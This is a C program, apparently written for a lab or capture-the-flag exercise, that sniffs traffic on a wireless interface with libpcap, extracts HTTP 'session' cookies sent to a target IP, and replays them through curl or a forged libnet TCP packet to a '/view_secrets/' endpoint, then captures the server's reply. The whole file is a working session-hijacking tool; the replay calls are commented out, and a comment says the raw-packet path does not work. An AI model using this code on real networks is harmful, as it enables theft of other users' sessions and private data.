#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

void print_all_devs(pcap_if_t *alldevs) {
    pcap_if_t *d;
    printf("Available interfaces:\n");
    for (d = alldevs; d != NULL; d = d->next) {
        printf("  %s", d->name);
        if (d->description) {
            printf(" - %s", d->description);
        }
        printf("\n");
    }
}

uint8_t* find_ip_start_eth(const uint8_t *data, size_t len) {
    if (len < 14) {
        return NULL;
    }

    size_t off = 12;
    uint16_t ethertype = (data[off] << 8) | data[off + 1];
    off += 2;
    while (ethertype == 0x8100 || ethertype == 0x88a8 || ethertype == 0x9100 || ethertype == 0x9200) {
        if (len < off + 4) {
            return NULL;
        }
        off += 2; // skip vlan tag
        ethertype = (data[off] << 8) | data[off + 1];
        off += 2;
    }

    if (ethertype == 0x0800 || ethertype == 0x86dd) {
        if (len < off) {
            return NULL;
        }
        return (uint8_t *)(data + off);
    }

    return NULL;
}

uint8_t* find_ip_start(const uint8_t *data, size_t len, int dlt) {
    if (len < 14 + 20) {
        return NULL;
    }
    switch (dlt) {
        case DLT_EN10MB:
            return find_ip_start_eth(data, len);
        default:
            fprintf(stderr, "Unsupported dlt: %d\n", dlt);
            return NULL;
    }
}

void send_get_with_cookie_new_tcp(const char *dst_ip, uint16_t dst_port, const char *cookie) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "curl -s -b 'session=%s' http://%s:%d/view_secrets/",
        cookie, dst_ip, dst_port
    );
    printf("Running: %s\n", cmd);
    system(cmd);
    printf("\n");
}

// Note that this doesn't work for now, because it is not a continuation of an existing TCP stream,
// The server closes the old one, so we can't reuse
void send_get_with_cookie(libnet_t *l, const char *src_ip, const char *dst_ip, uint16_t src_port, uint16_t dst_port, const char *cookie) {
    libnet_clear_packet(l);
    printf("Sending GET with cookie %s from %s:%d to %s:%d\n", cookie, src_ip, src_port, dst_ip, dst_port);
    char http_payload[512];
    int http_payload_len = snprintf(http_payload, sizeof(http_payload),
        "GET /view_secrets/ HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Cookie: session=%s\r\n"
        "\r\n",
        dst_ip, cookie
    );
    if (http_payload_len < 0 || http_payload_len >= (int)sizeof(http_payload)) {
        fprintf(stderr, "HTTP payload is too large\n");
        return;
    }
    libnet_ptag_t tcp_tag = libnet_build_tcp(
        /*
        dst_port,
        src_port,
        */
        src_port,
        dst_port,
        0, //seq
        0, //ack
        TH_PUSH | TH_ACK, // Control flags
        65535, // window
        0, // checksum, autofill
        0, // urgent pointer
        20 + http_payload_len, // total length of tcp packet
        (uint8_t *)http_payload, // payload
        http_payload_len, // payload size
        l, // libnet context
        0 // 0 to build new one
    );
    if (tcp_tag == -1) {
        fprintf(stderr, "libnet_build_tcp failed: %s\n", libnet_geterror(l));
        return;
    }
    // Create ip header
    libnet_ptag_t ip_tag = libnet_build_ipv4(
        20 + 20 + http_payload_len, // ip + tcp + payload
        0, // TOS
        0x1234, // ID
        0, // fragmentation
        64, // TTL
        IPPROTO_TCP, // protocol
        0, // checksum, autofill
        /*
        dip,
        sip,
        */
        libnet_name2addr4(l, (char *)src_ip, LIBNET_DONT_RESOLVE),
        libnet_name2addr4(l, (char *)dst_ip, LIBNET_DONT_RESOLVE),
        NULL,
        0,
        l, // libnet context
        0 // 0 to build new one
    );
    if (ip_tag == -1) {
        fprintf(stderr, "libnet_build_ipv4 failed: %s\n", libnet_geterror(l));
        return;
    }
    int bytes = libnet_write(l);
    if (bytes == -1) {
        fprintf(stderr, "libnet_write failed: %s\n", libnet_geterror(l));
    } else {
        printf("Injected %d bytes(eth + ip + tcp)\n", bytes);
    }
}

int main(int argc, char *argv[]) {
    // <source ip> <destination ip> <approach>
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <source ip> <destination ip> <approach>\n", argv[0]);
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs = NULL;

    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "Error finding devices: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    print_all_devs(alldevs);

    pcap_t *handle = pcap_open_live("wlp1s0", 65535, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        pcap_freealldevs(alldevs);
        return 1;
    }

    struct pcap_pkthdr *header;
    const uint8_t *data;
    int rc = pcap_next_ex(handle, &header, &data);
    int dlt = pcap_datalink(handle); // Probably ether
    // find first icmpv4 and type 47
    // Initialize libnet
    libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!l) {
        fprintf(stderr, "libnet_init failed: %s\n", errbuf);
        return 1;
    }
    char session_cookie[256];
    while (rc == 1) {
        uint8_t *ip = find_ip_start(data, header->len, dlt);
        if (!ip) {
            // Not Ethernet + IP header
            rc = pcap_next_ex(handle, &header, &data);
            continue;
        }

        //printf("DEBUG: Got packet of length %d\n", header->len);
        // Check if from source ip and to dest ip

        uint8_t ver_ihl = ip[0];
        uint8_t version = ver_ihl >> 4;
        uint8_t ihl = ver_ihl & 0x0F;
        if (version != 4) {
            rc = pcap_next_ex(handle, &header, &data);
            continue;
        }
        if (ip[9] != 6) {
            // Not tcp
            rc = pcap_next_ex(handle, &header, &data);
            continue;
        }
        char src_ip[16];
        snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", ip[12], ip[13], ip[14], ip[15]);
        char dst_ip[16];
        snprintf(dst_ip, sizeof(dst_ip), "%d.%d.%d.%d", ip[16], ip[17], ip[18], ip[19]);

        //printf("Captured packet from %s to %s\n", src_ip, dst_ip);

        //if (strcmp(src_ip, argv[1]) == 0 && strcmp(dst_ip, argv[2]) == 0) {
        if (strcmp(dst_ip, argv[2]) == 0) {
            //printf("Captured packet from %s to %s\n", src_ip, dst_ip);
            uint8_t *tcp = ip + ihl * 4;
            // Get tcp header length
            uint8_t tcp_hlen = tcp[12] >> 4;

            uint16_t src_port = (tcp[0] << 8) | tcp[1];
            uint16_t dst_port = (tcp[2] << 8) | tcp[3];
            //printf("Captured packet from %s to %s\n", src_ip, dst_ip);
            //printf("  With ports %d to %d\n", src_port, dst_port);

            /*
            if (dst_port == 80 || dst_port == 5000) {
                printf("Probably HTTP from %s to %s\n", src_ip, dst_ip);
            }
            */
            uint8_t *http = tcp + tcp_hlen * 4;
            if (http >= data + header->caplen) {
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }
            if (http < data + header->caplen) {
                //printf("  Http payload size: %ld\n", data + header->caplen - http);
            }
            // Print the begining of http:
            // printf("  First 16 bytes of payload: ");
            // for (int i = 0; i < 16 && http + i < data + header->caplen; i++) {
            //     printf("%02x ", http[i]);
            // }
            // Check if http:
            if (memcmp(http, "GET ", 4) == 0 || memcmp(http, "POST ", 5) == 0) {
                printf("  Probably HTTP from %s to %s\n", src_ip, dst_ip);
            } else {
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }

            if (http + 4 >= data + header->caplen) {
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }
            uint8_t *cookie = memmem(http, data + header->caplen - http, "Cookie: ", 8);
            if (!cookie) {
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }
            cookie += 8;
            uint8_t *cookie_end = memchr(cookie, '\r', data + header->caplen - cookie);
            if (!cookie_end) {
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }
            printf("  Found cookie: %.*s\n", (int)(cookie_end - cookie), cookie);

            // Get the session cookie:
            int session_cookie_len = 0;
            uint8_t *session_cookie_start = memmem(cookie, cookie_end - cookie, "session=", 8);
            if (session_cookie_start) {
                session_cookie_start += 8;
                uint8_t *session_cookie_end = memchr(session_cookie_start, ';', cookie_end - session_cookie_start);
                if (!session_cookie_end) {
                    session_cookie_end = cookie_end;
                }
                session_cookie_len = session_cookie_end - session_cookie_start;
                if ((size_t)session_cookie_len >= sizeof(session_cookie)) {
                    session_cookie_len = sizeof(session_cookie) - 1;
                }
                memcpy(session_cookie, session_cookie_start, session_cookie_len);
                session_cookie[session_cookie_len] = '\0';
                printf("  Found session cookie: %s\n", session_cookie);
            } else {
                printf("  No session cookie 'session' found\n");
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }

            printf("Session cookie: %s\n", session_cookie);

            //send_get_with_cookie(l, src_ip, dst_ip, src_port, dst_port, session_cookie);
            //send_get_with_cookie_new_tcp(dst_ip, dst_port, session_cookie);
            break; // Only send one request

            //printf("TCP flags: 0x%02x\n", tcp[13]);
        }

        rc = pcap_next_ex(handle, &header, &data);
    }
    if (rc == 0) {
        printf("Timeout waiting for packet\n");
    } else if (rc == -1) {
        fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(handle));
    }
    // Here we already sent the request with the cookie. (via curl)
    // Listen for the response, which should be from dst_ip to src_ip, and contain the secret in http body
    while (rc == 1) {
        uint8_t *ip = find_ip_start(data, header->len, dlt);
        if (!ip) {
            // Not Ethernet + IP header
            rc = pcap_next_ex(handle, &header, &data);
            continue;
        }
        uint8_t ver_ihl = ip[0];
        uint8_t version = ver_ihl >> 4;
        uint8_t ihl = ver_ihl & 0x0F;
        if (version != 4) {
            rc = pcap_next_ex(handle, &header, &data);
            continue;
        }
        if (ip[9] != 6) {
            // Not tcp
            rc = pcap_next_ex(handle, &header, &data);
            continue;
        }
        char src_ip[16];
        snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", ip[12], ip[13], ip[14], ip[15]);
        char dst_ip[16];
        snprintf(dst_ip, sizeof(dst_ip), "%d.%d.%d.%d", ip[16], ip[17], ip[18], ip[19]);
        if (strcmp(src_ip, argv[2]) == 0 && strcmp(dst_ip, argv[1]) == 0) {
            uint8_t *tcp = ip + ihl * 4;
            uint8_t tcp_hlen = tcp[12] >> 4;
            uint16_t src_port = (tcp[0] << 8) | tcp[1];
            uint16_t dst_port = (tcp[2] << 8) | tcp[3];
            uint8_t *http = tcp + tcp_hlen * 4;
            if (http + 4 >= data + header->caplen) {
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }
            // The http response might be split into multiple packets,
            // so the body we are looking for might not start with HTTP/
            // if (memcmp(http, "HTTP/", 5) != 0) {
            //     rc = pcap_next_ex(handle, &header, &data);
            //     continue;
            // }
            // Print the entire http response for debug:
            printf("DEBUG: Received response from %s to %s:\n%.*s\n", src_ip, dst_ip, (int)(data + header->caplen - http), http);
            // Find the body, which is after \r\n\r\n
            uint8_t *body = memmem(http, data + header->caplen - http, "\r\n\r\n", 4);
            if (!body) {
                rc = pcap_next_ex(handle, &header, &data);
                continue;
            }
            body += 4;
            size_t body_len = data + header->caplen - body;
            printf("Received response with body:\n%.*s\n", (int)body_len, body);
            //break; // Stop after first response
        }
        rc = pcap_next_ex(handle, &header, &data);
    }
    return 0;
}